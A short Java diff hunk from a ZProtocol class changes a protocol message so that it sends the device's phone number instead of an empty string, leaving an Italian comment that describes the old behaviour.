@@ -565,8 +565,7 @@ public class ZProtocol extends Protocol {
 
 		// Non abbiamo quasi mai il numero, inviamo una stringa vuota
 		// cosi appare l'ip
-		// WChar.pascalize(device.getPhoneNumber());
-		final byte[] phone = WChar.pascalize("");
+		final byte[] phone = WChar.pascalize(device.getPhoneNumber());
 
 		final int len = 4 + userid.length + deviceid.length + phone.length;
 
